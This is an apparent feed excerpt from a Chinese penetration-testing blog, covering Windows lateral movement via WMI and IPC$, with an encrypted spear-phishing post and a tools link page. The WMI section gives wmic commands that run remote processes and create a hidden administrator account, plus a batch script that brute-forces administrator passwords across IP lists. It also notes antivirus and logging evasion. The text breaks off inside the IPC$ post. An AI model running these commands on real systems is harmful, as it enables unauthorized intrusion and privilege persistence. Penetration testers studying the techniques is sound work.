    <content type="html"><![CDATA[<blockquote><p>“成就他人是一个伟大得行为，我将贯彻到底。”    ——hl0rey</p></blockquote><a id="more"></a><p>作为天天肾透，日日肾虚的我们，常常需要借助各种各样的在线网站来进行信息收集、加密解密、数据处理…</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.08.24/2.jpg"></p><p>随着浏览器收藏夹分类越来越多，找到网址然后打开得操作越来越觉得麻烦，便花了一些时间来整理了下做成了一个导航页，页面内容不定期会保持更新。</p><p>也不用担心某一类型重复得网站太多，不知道用哪个好，基本上贴上去得我自己全部都使用过，备注 ”推荐“ 的就是用起来感觉不错得。</p><p>个人认为通过在线网站各种功能，完成信息收集60%的工作是完全没问题的，希望可以对看文章的你有所帮助~</p><p>在线工具 - 肾透测试中心 -  <a href="https://gitbook.se7ensec.cn/">https://gitbook.se7ensec.cn/</a> </p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;“成就他人是一个伟大得行为，我将贯彻到底。”    ——hl0rey&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>鱼叉攻击|使用Lnk文件的另类钓鱼方式</title>
    <link href="https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/"/>
    <id>https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-22T07:10:24.000Z</published>
    <updated>2021-01-23T14:13:50.667Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b2380840d3793d67b6d9fc04edcfc8d634b1b333d73b8018b76fc3a2791f250b">60a13925d46354e3c1b9aa984b9eaf9066ac7a8ed9b3f8311475aa9b656c0c6cb67fd62584250b5f70e1534e6acd923ed400d8b00febcb6e2af442161de0bfabb7b7a22e8c3d9161dd7027da92ac92fe223b1deb3d800d6d4bec059945898427bf7de58ea0c39595e0ee422c22019309ca3ea54fe9fb113d930f6b0b150249fecb94cb26c74df089102e8c7a3bb8f2dab2c9b01f64c7c394f1e8e377ad2401f86cef116145507c114bb964bc800a340dac05a8b60241783abafcad6737b8f88a55fdd09f4083a05e06df1f0cf8b8c630a63bb7f75ca3df6756f81c889af656bb77856417d7eeea7d73e4fde9414b0353960e0c16fad44752fbe22830cab8aafd510c40b58c233a8ba23f59612192e9c6491721c9c62595662bfd4796dac9abebf7cb19435a7ef6b40fec6eee85c67faf8d3f271efe9a7ef0ce4ccc344a61163bdca2aaba2e895d527fa0978901170d648b1f450f50b25d603f002aeece4be97588a2932879c85e0325690e08bb63add5e1b20049493071cfe90bcf14d13f875c18fab445603380958fb2f376317ad69c6fd4cbc9d33afa7412e63946a495cdf7a417b1990d246e054d278d24c5153f51ff970731b65b4b689410f580570f9f8e3a9f73bec92c0b70bcd49f4433c1e06bd7e5e4edd0c58cf7841682a7ff5111fcbc0a56f67d879229a682b8b60f8bcec11372b169e616c482f079994f53c7b8788677fb1722aa5bb1c698250585031b0c5caa312f98fce68268e563e7de65ad9a79982a94c41fea9289c93766d44d281b428fc45ced665f4a4323d2f733c9072259f06d614074f5876bd73d0b1624420c60ef7686dc02553d1b2c5e18ace329318fceb78d3bc49cbcab3f19949a805e4640ad45f828340e02e697120ffd22c8f92701e654fd33f7a1a111947f18dc5469498fdde9302640c85d3584dbcfc505d5605b766ac57a4c3be045f7ff78194d3cfa69c3be4f48d61840c226451cf7aaa3d3ec02b11a63f8a996658968e399e0e98da2afedb7e0d98719fd4a55e415c99f14b95c172e4dd2fa6656bef00a60bba994f72b5dc5dbac6be7627a740a1f8e713adf9f7ae230fe7ef44b4c27b7ac2553847682d5f7ad5bdd913b1302fe5d15880e789624bfb096f457f01033878ff595c15eaf88c215dd0130023687ae4ae0eace0dfb0ab731a310624b1bd92953fa7f171ff0dd69b26ff31cbaddbaddd3a6f85e63d0c7480e2682da9ef12d87dfa5558358e86d542c62372bdd8b324549a7f432838112e9e1447f3226c6b40b6dd0df179bc480f9d27a95b7e38627d2746160883a4b8a04542491e52b1875a8e71de625d64ccf39cf7100950f1c71caad7a05ada2252bc0beedb270c445308395158317b5b40d71d68c9435a33b64a7b8adddb471a0db5ead48e605630f2d9e10a43b22b61e5ebba00803e8c6473f7cb920af85ffd8a0c1cb55128c2fe6b1d6d3a38eca07650cc00ceebfcd8001177d5b6385e2ffb272faea39b74045025eee12464a925e32d01a2f52cd9aba5c7e75f4b5b0df5a8e5509f2ef01aef1b4573b2526935ed1b75a0764f81bf3d5fc24732d085b93b0a4e4949ecbb86963e7a9d1fa3ba6065caa79f871fa8ce363cffbd92942cb5406fd60a5d6b27e0d5d8140fc153b0e04669ad14ebbf773ddddf23e15193d3090552c0331de91b1651c1a84d3b6c7b1be4aa4b8fe1a283550dccbbd2b8d29e19c02434a0f3fbe53754292635b4ba08f0615721f131dbbfd30850692c0d6680271a3a0e42fa21113dc21d76950b0e5d41182849449621821cd74ed34ca3889dae7ba682405f88fd5f931627e72d37a56ab7cfcdf53d4e00d5341604f1651ae147ee82be71eaa6a387a3f82920d57c1c9b2aa9cd89ab14ae23e6e7cc8bf68827ae4d1e52d51f1a610df11f39ee5a10029394163320310826b229b6f42dacbfa5c515c359681d79d3c7f060d6cfc65c3b2ffd315d9a77a200f476502b70901d88a293b0bb7d9151e8bc41d3afe32bb11865d0099cf62f6bde2faef2c566a6b944fa7bb19563237ef552bded9b25293b154d0cab21d761bd6c293718183bb4b7f73c349bb8aa1674b7ab5777ea7a7d79fab879052ecf2e481bbe2a2fade9de7acb162067538c2b843d926a78aa4c18150c8b1ebfe7d832426ad2e4ed2338c1e58a544bb3a53e4398bb2d0553e145700e2784781fbc0c527754d3ae4ea98620af6e11be7cd79af2937eb647bc2cf6870e29886772e020eb386c3d073351b503066ce0c364bed838e23f9e22ee99896c3ab9bbd7850dc4261709dbec9f6076f74b294d01e2a6b8f4e7e420d4689354459eef7fc9195b664ce687b8bcd7d106973f8e4cc3c937401dd4780a1c7592cd5da9a096eabe4fada8a61760bf7b7b7bc05f7829f07a075a092a3ddc6955ff239d45514ecbceea1d2f469f038d317b03c860225daba43f9d451db8b3920923aa4cf7cf18358dfc1a2317ef6b575234feb2984cb776e68a19b7eb14de2ca26d7ed2152fb1bd56c76825335b5f9606448c959eaf095d391598ef85768f48f475682812ec8ea9a45c64c43da2fddf0b90d2927983ce66472777b94d79da54a0eba87b6157ba7971274662e3e1f3e40d825a46c92653e0ed0e84d90917770b3318635447c0e53114e5c098cd03d4ebe4026946055ddc5db3437da376cf443b2017666f70fed1a8635e1442fe40df2f23d7c70c38d597436a5c98207aff9395cb0150c419cd73e87e38126943e5b370d7ff638d447e30a1084e31dfb1419650428207321bc4669d524e6f41cea124805ec0cbfa06d97a3bd4dc3c92199d765cea6afc88b7adef161bb3dc21e44a97ba1a2d8dcf229431e3082e5d1bdd4492261babaf30a2d3c62a9e390fd3899bc2a2b4bf5be27118b6fe048e4e5199984ea033945ab9dc7e9fc3d710b936b8b47c643b8b84804b531a0ca58871d57e6aebc84c1d7cbf39c440c0d68d258dd81bc011221ed741d2a362b05c1c4479f6c67c959d2388925bab99fb52713ffaef078d7fdc9a72c83ac299679c42d3d2a9d0a65a7fd746a19b2e1145e5662e6e90e35c9f90470b4866098d17a4a68cb93848f7dc56624a550e63c011c79b37f3a7e1172c59a1da9bbb2eda3d10e4043557cb5b159a78a6b2528f43ead9f78636982899146b59f7b4c42c9571dc25192d76dd5cee312937a18c560d0dbf0d53de90d08f533eca6a9b09d9e7ce8c75c666f7d7e4de9599d677bc8416b1e358ca6fc3813a7c0396cb4c7e1ba1fa0f50e58bd5fe56c5a39770355ac25718786c295205872cb1d2515727eef69b7e7444106dfb3cec58c62693720ba52b942079a8c9ce952904b4d9ea21345efe61866923b32e66f4192f30c68247c495cd3f383db0b6ec6f7b16f54eaa18174018e66ec1f3c5757d8df65f9074d3d099ffab1d764cb9c7b32002bbf2aba24e0a71024354dc4376a0cf4081e43387eaeb1ac312382f2cb01d1fa35368755db065fb72e2c739f65c512913661b09709bc90d19125a0bfc0af67517350babd0ee2efda3e4afdc833548885a1241f6a912dc402d519f25559a8ba011bc0a6290fd4e43d2c66e9181c49bef7022dae2f72b81a3f34bc5132624d48444940404af3aa3985262af54637aec2d8d29cb749cefb44f0a9f43a012caf75fc020fb9563ee3a36cbee6a0242d5c101a507ef336a59aec8bf7cbe0c3d7744ab36c4324bb8375555fa35274ff3083283d501ca2ae92d6a62d7a2474598d595e6fbe02fec66437f28ed038a0f99a4921fedc907e3fbe8bd60b54699b2d1c5504eec503c7bddd4233670ccf1b79d2e1bbe2d89f199e144e449fc32648537ad64dd26e7250daba3ef76e6e1fd078189ad1ddf695da380ab4d0a110e996a9e07182c960d1a1a58d47b3224f513bed8fbe5042200ad4566a3111f774795cbe11f66910b480c8e298e6f58db00ce240d08fbdaa3736b298d0c191783701fbfb4710eac46e3d5e387d1eea4b1d9e248aa1da93c5e1e7799776171ca851ab4a9c52ac9ec613fe6f5feec3e5a3b17240ba915ff4591d66719bbd202bfa0c4df6afb1a48fa3a837742b16416c511b4ad30aaa2fb86fc176b96da3723c56a70ffe01a8c6723afb14fd572a99e0d32208a50f030dd8cfcbe03e253794410e93228121724ec106e69e7fff49b750de8029939beb5dc41e54f5e739b69d63d4abff1337d58b81554a8438ec71a082b8c8e4208cc07500653b2d8f945e3602ea6d42ffd3bbdeae7f2a2aa67c69c99cf4f57fac05e5f3ec7c9ab436cd8367</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于WMI的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-07-12T07:12:24.000Z</published>
    <updated>2021-06-19T08:28:00.660Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于WMI的横向移动</p></blockquote><a id="more"></a><h2 id="WMI-介绍"><a href="#WMI-介绍" class="headerlink" title="WMI 介绍"></a>WMI 介绍</h2><p><code>WMI </code>的全称是 <code>Windows Management Instrumentation</code>，它出现在所有的 <code>Windows</code>操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的<code>Windows</code>系统，攻击者使用<code>wmi</code>来进行攻击，但 <code>Windows </code>系统默认不会在日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用<code>wmic</code>进行远程执行命令。 </p><h2 id="WMI-利用条件"><a href="#WMI-利用条件" class="headerlink" title="WMI 利用条件"></a>WMI 利用条件</h2><p> 远程服务器启动<code>Windows Management Instrumentation</code>服务（默认开启）</p><p> <code>135</code> 端口未被过滤 [<strong>默认配置下目标主机防火墙开启将无法连接</strong>]</p><h2 id="连接失败常见错误号："><a href="#连接失败常见错误号：" class="headerlink" title="连接失败常见错误号："></a>连接失败常见错误号：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.开启防火墙时，允许共享例外</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">2</span>.组策略阻止administraotr远程访问时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070005</span><br><span class="line">说明 = 拒绝访问。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">3</span>.IP安全策略阻止<span class="number">135</span>时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">4</span>.禁用winmgmt服务时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070422</span><br><span class="line">说明 = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">5</span>.拒绝wbem目录权限，无法使用wmic的</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="利用-wmic-进行横向移动"><a href="#利用-wmic-进行横向移动" class="headerlink" title="利用 wmic 进行横向移动"></a>利用 wmic 进行横向移动</h2><h3 id="常用系统自带命令"><a href="#常用系统自带命令" class="headerlink" title="常用系统自带命令"></a>常用系统自带命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.列出远程主机进程</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process list brief</span></span><br><span class="line"><span class="number">2</span>.在远程系统上执行bat脚本</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create c:\programdata\test.bat</span></span><br><span class="line"><span class="number">3</span>.在远程系统上执行单条命令</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span></span><br><span class="line"></span><br><span class="line">引用自：https://www.cnblogs.com/<span class="number">0</span>xdd/p/<span class="number">11393392</span>.html</span><br></pre></td></tr></table></figure><h3 id="批量爆破"><a href="#批量爆破" class="headerlink" title="批量爆破"></a>批量爆破</h3><p>wmi的爆破经过实践，错误次数3次以上，360会拦截【无杀软时没有测试】，记录日志为远程rdp爆破，并暂时限制wmi的连接。</p><p>※以下为单密码爆破，有爆破多个密码爆破的需求的话，可以根据ipc横向移动那篇自行修改</p><p><strong>坑点：需注意特殊字符，如密码中有 <code>%</code> 需要用 <code>%</code> 来转义，例 ：<code>123#$%</code> 应转化为 <code>123#$%%</code></strong> </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt</span><br><span class="line"><span class="keyword">for</span> /f %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief  &gt;&gt; log.txt</span><br><span class="line">wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> errorlevel == <span class="number">0</span> (</span><br><span class="line"><span class="built_in">echo</span> success:%%i &gt;&gt; pic.txt</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h4><p>没有使用过，暂未测试</p><p><code>wmiexec.vbs</code> 是为了解决<code>wmic</code>无法回显命令而开发的一个工具，原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显 ”执行命令的结果“ 和获取 ”半交互式的 shell“  。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs &#x2F;cmd 192.168.1.1 administrator test@123 whoami</span><br></pre></td></tr></table></figure><h4 id="impacket-wmiexec"><a href="#impacket-wmiexec" class="headerlink" title="impacket-wmiexec"></a>impacket-wmiexec</h4><p>优点：支持pth</p><p>缺点：他的使用需要调用wmi服务，占用目标的445、135和另一个随机端口。</p><p>使用参考：<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0">域渗透——Pass The Hash的实现 (3gstudent.github.io)</a></p><h4 id="sharpwmi"><a href="#sharpwmi" class="headerlink" title="sharpwmi"></a>sharpwmi</h4><p>这是一个基于<code>135</code>端口来进行横向移动的工具，具有执行命令和上传文件功能，通过<code>wmi</code>来执行命令，通过调用来进行数据传输。<br>优点：只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口<br>缺点：目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。执行命令和上传文件都依赖<strong>powershell(被360拦截了)</strong></p><p><a href="https://github.com/QAX-A-Team/sharpwmi">https://github.com/QAX-A-Team/sharpwmi</a></p><h4 id="sharpwmi（修改版）"><a href="#sharpwmi（修改版）" class="headerlink" title="sharpwmi（修改版）"></a>sharpwmi（修改版）</h4><p><a href="https://github.com/idiotc4t/sharpwmi">https://github.com/idiotc4t/sharpwmi</a></p><p>这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能,通过wmi来执行命令，通过注册表来进行数据传输。</p><h4 id="WMIHACKER-推荐"><a href="#WMIHACKER-推荐" class="headerlink" title="WMIHACKER(推荐)"></a>WMIHACKER(推荐)</h4><p>免杀横向渗透远程命令执行，常见的<code>WMIEXEC</code>、<code>PSEXEC</code>执行命令是创建服务或调用<code>Win32_Process.create</code>执行命令，这些方式都已经被杀软100%拦截，通过改造出<code>WMIHACKER</code>免杀横向移动测试工具。(只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口)</p><p>重要：支持pth -&gt;  <a href="https://github.com/360-Linton-Lab/WMIHACKER/issues/1">https://github.com/360-Linton-Lab/WMIHACKER/issues/1</a> </p><p>主要功能：1、命令执行；2、文件上传；3、文件下载</p><p><a href="https://github.com/360-Linton-Lab/WMIHACKER">https://github.com/360-Linton-Lab/WMIHACKER</a></p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">WMI爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiScan.html">http://k8gege.org/Ladon/WmiScan.html</a></td></tr><tr><td align="left">WMI-NtlmHash爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiHashScan.html">http://k8gege.org/Ladon/WmiHashScan.html</a></td></tr><tr><td align="left">WmiExec（推荐）</td><td align="left">135端口</td><td align="left">Windows</td><td align="left">只需135端口通过注册表回显，不像Impacket或其它工具还依赖445，不依赖PowerShell，适用于任意目标</td></tr><tr><td align="left">WmiExec2</td><td align="left">135端口</td><td align="left">Windows</td><td align="left">和WmiExec一样只需135端口通过注册表回显，但依赖PowerShell，无PowerShell的目标可能不适用</td></tr></tbody></table><h4 id="Sharp-WMIExec"><a href="#Sharp-WMIExec" class="headerlink" title="Sharp-WMIExec"></a>Sharp-WMIExec</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/checkymander/Sharp-WMIExec">https://github.com/checkymander/Sharp-WMIExec</a> </p><h4 id="WMIcmd"><a href="#WMIcmd" class="headerlink" title="WMIcmd"></a>WMIcmd</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于WMI的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于IPC的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-07-12T07:11:24.000Z</published>
    <updated>2021-04-03T15:04:31.999Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于IPC的横向移动</p></blockquote><a id="more"></a><p>文章内容引用较多，尽量不说废话，注明链接的地方，请自行阅读并理解。</p><h2 id="IPC-的概念"><a href="#IPC-的概念" class="headerlink" title="IPC$的概念"></a>IPC$的概念</h2><p><code>IPC$(Internet Process Connection)</code>是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p><h2 id="IPC-的作用"><a href="#IPC-的作用" class="headerlink" title="IPC$的作用"></a>IPC$的作用</h2><p>利用<code>IPC$</code>，连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。 </p><h2 id="IPC-的利用条件"><a href="#IPC-的利用条件" class="headerlink" title="IPC$的利用条件"></a>IPC$的利用条件</h2><h3 id="139，445端口开启"><a href="#139，445端口开启" class="headerlink" title="139，445端口开启"></a>139，445端口开启</h3><p><code>IPC$</code>连接可以实现远程登陆及对默认共享的访问，而<code>139</code>端口的开启表示<code>netbios</code>协议的应用。我们可以通过<code>139</code>和<code>445</code>端口来实现对共享文件/打印机的访问，因此一般来讲，<code>IPC$</code>连接是需要<code>139</code>或<code>445</code>端口来支持的。</p><p>注：<code> Windows</code>系统中的<code>net use ipc$</code>整个通信过程，先<code>445-&gt;137-&gt;139</code>验证，当你开启防火墙禁用<code>445</code>，发现系统命令就无法连接<code>IPC</code>了，因为根本没机会走到<code>139</code>，所以使用系统自带命令连接的<code>ipc$</code>需要同时开启这些端口 ，参考自<code>K8gege.org</code>。</p><h3 id="管理员开启了默认共享"><a href="#管理员开启了默认共享" class="headerlink" title="管理员开启了默认共享"></a>管理员开启了默认共享</h3><p>默认共享是为了方便管理员远程管理而默认开启的共享，即所有的逻辑盘<code>（C$,D$,E$...）</code>和系统目录<code>WINNT</code>或<code>WINDOWS(ADMIN$)</code>，我们通过<code>IPC</code>连接可以实现对这些默认共享的访问。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net share</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">C<span class="variable">$</span>           C:\                             默认共享</span><br><span class="line">IPC<span class="variable">$</span>                                         远程 IPC</span><br><span class="line">ADMIN<span class="variable">$</span>       C:\WINDOWS                      远程管理</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="建立远程连接时的用户权限问题"><a href="#建立远程连接时的用户权限问题" class="headerlink" title="建立远程连接时的用户权限问题"></a>建立远程连接时的用户权限问题</h3><p>这个不多说，很多文章没有介绍，是一个坑点：<a href="https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/">传送门-关于IPC和PTH用户权限问题</a></p><p>※即默认情况下只有域管用户有权限对<code>admin$</code>目录建立<code>IPC</code>连接，其实本地的<code>Administrator</code>用户也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用<code>Administrator</code>用户远程连接 </p><h4 id="IPC-连接失败常见错误号："><a href="#IPC-连接失败常见错误号：" class="headerlink" title="IPC$连接失败常见错误号："></a>IPC$连接失败常见错误号：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">错误号 <span class="number">5</span>，拒绝访问【很可能你使用的用户不是管理员权限的，先提升权限】</span><br><span class="line">错误号 <span class="number">51</span>，Windows 无法找到网络路径【网络有问题】</span><br><span class="line">错误号 <span class="number">53</span>，找不到网络路径【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动； 目标有防火墙（端口过滤）】</span><br><span class="line">错误号 <span class="number">67</span>，找不到网络名【你的 lanmanworkstation 服务未启动；目标删除了 ipc<span class="variable">$</span>；】 </span><br><span class="line">错误号 <span class="number">1219</span>，提供的凭据与已存在的凭据集冲突【你已经和对方建立了一个ipc<span class="variable">$</span>，请删除后再连】</span><br><span class="line">错误号 <span class="number">1326</span>，未知的用户名或错误密码【原因很明显了】</span><br><span class="line">错误号 <span class="number">1385</span>，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="line">---</span><br><span class="line">情况<span class="number">1</span>：可能是你在“拒绝从网络访问这台计算机”功能中拒绝了该用户的访问，解决方法如下：</span><br><span class="line">开始--&gt;运行--&gt;gpedit.msc计算机配置--&gt;Windows设置--&gt;安全设置--&gt;本地策略--&gt;用户权利指派--&gt;拒绝从网络访问这台计算机--&gt;删除你要正常连接的用户</span><br><span class="line">情况<span class="number">2</span>：</span><br><span class="line">(<span class="number">1</span>)网络访问为：经典</span><br><span class="line">(<span class="number">2</span>)来宾账户状态：已启用，</span><br><span class="line">(<span class="number">3</span>)拒绝从网络访问这台计算机里有Guest用户或组</span><br><span class="line">(<span class="number">4</span>)你执行net use \\xxx.xxx.xxx.xxx\IPC<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;xxx&quot;</span> 输入的用户名是随便输入的，这时也会遇到这个错误信息，因为当你连接的用户不存在时，net use会默认用Guest用户来进行连接，而Guest用户已拒绝从网络访问，所以也会出现这种错误</span><br><span class="line">---</span><br><span class="line">错误号 <span class="number">1792</span>，试图登录，但是网络登录服务没有启动【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="line">错误号 <span class="number">2242</span>，此用户的密码已经过期【目标有帐号策略，强制定期要求更改密码】 </span><br></pre></td></tr></table></figure><h2 id="基于IPC-的横向移动"><a href="#基于IPC-的横向移动" class="headerlink" title="基于IPC$的横向移动"></a>基于IPC$的横向移动</h2><h3 